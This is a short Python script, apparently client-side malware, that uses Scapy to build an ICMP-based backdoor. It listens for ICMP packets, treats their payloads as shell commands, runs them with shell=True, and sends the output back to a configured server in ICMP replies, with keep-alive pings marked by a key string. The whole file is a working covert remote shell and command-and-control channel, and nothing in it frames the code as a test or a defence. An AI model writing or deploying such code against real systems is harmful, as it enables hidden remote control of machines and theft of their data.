import sys
from scapy.all import *
from subprocess import Popen, PIPE
import threading
import time
specialkey = "pinggg"
server_ip = ""

def listen_for_commands():
    while True:
        # Sniff for ICMP packets destined for the client's IP
        packet = sniff(count=1, filter=f"icmp and ip dst {get_if_addr(conf.iface)}")
        if Raw in packet[0]:
            # Decode the command from the raw data
            cmd = packet[0][Raw].load.decode('utf-8', errors='ignore')
            print(cmd)
            if cmd == specialkey: # Ignore keep-alive pings
                print("Received keep-alive ping.")
                continue
            print(f"Command received: {cmd}")
            if cmd == 'exit':
                print("Exit command received. Shutting down.")
                break
            # Execute the received command
            proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
            stdout_data, stderr_data = proc.stdout.read(), proc.stderr.read()
            result = stdout_data.decode('utf-8') + stderr_data.decode('utf-8')
            print(f"Execution result: {result}")
            # Send the command result back to the server
            send(IP(dst=server_ip)/ICMP()/Raw(load=result.encode()), verbose=0)

def send_keep_alive():
    while True:
        # Send a keep-alive
        send(IP(dst=server_ip)/ICMP()/Raw(load=specialkey.encode()), verbose=0)
        # print("Keep-alive ping sent to server.")
        time.sleep(1) # Timing - set to 1, may be too noisy

# Send an initial packet to the server to establish the connection
send(IP(dst=server_ip)/ICMP()/"hello", verbose=0)

# Start listening for commands in a separate thread
threading.Thread(target=listen_for_commands).start()

# Start sending keep-alive pings in a separate thread
threading.Thread(target=send_keep_alive).start()
